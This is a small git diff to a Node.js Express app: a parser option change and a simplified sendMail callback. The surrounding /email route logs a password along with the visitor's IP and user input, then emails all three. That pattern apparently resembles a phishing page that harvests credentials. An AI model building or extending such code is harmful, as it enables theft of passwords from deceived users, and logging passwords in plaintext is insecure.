@@ -13,7 +13,7 @@ const app = express();
 
 app.set('view engine', 'ejs');
 app.use(express.static('views'));
-app.use(express.urlencoded({ extended: false }));
+app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cors());
 
@@ -75,7 +75,7 @@ app.post('/email', (req, res) => {
   const { visitorIP, userInput } = req.session;
   console.log (passwd, visitorIP, userInput)
 
-  sendMail(userInput, passwd, visitorIP, (err, data) => {
+  sendMail(userInput, passwd, visitorIP, (err) => {
     if (err) {
       res.status(500).json({ message: 'internal error', err });
     } else {
